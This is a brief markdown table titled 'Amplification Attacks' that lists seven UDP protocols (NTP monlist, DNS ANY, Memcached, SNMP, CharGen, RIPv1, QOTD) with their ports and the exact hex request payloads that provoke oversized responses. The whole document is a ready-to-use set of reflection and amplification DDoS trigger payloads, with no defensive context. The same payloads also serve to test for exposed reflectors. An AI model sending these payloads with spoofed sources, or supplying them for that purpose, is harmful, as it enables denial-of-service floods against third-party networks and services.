# Amplification Attacks


|Protocol| Description |UDP Port | Request Payload HEX| 
|---| --- | ---| --- | 
|**NTP**| monlist command | 123 |`1700032a000000000000000000000000` | 
|**DNS**|  ANY google.com query| 53 |`17ea0100000100000000000106676f6f676c6503636f6d0000ff00010000290200000000000000` | 
|**Memcached**|  stat items |11211 | `5a4d0000000100007374617473206974` | 
|**SNMP**|  system description field using community string public | 161 |`302902010004067075626c6963a01c0204565adc5d020100020100300e300c06082b060102010101000500` |
|**CharGen**| one byte data "a" | 19 |`610a` |
|**RIPv1** | malformed request | 520 |`01010000000000000000000000000000`|
|**QOTD**| trigger a quote | 17 | `00`|
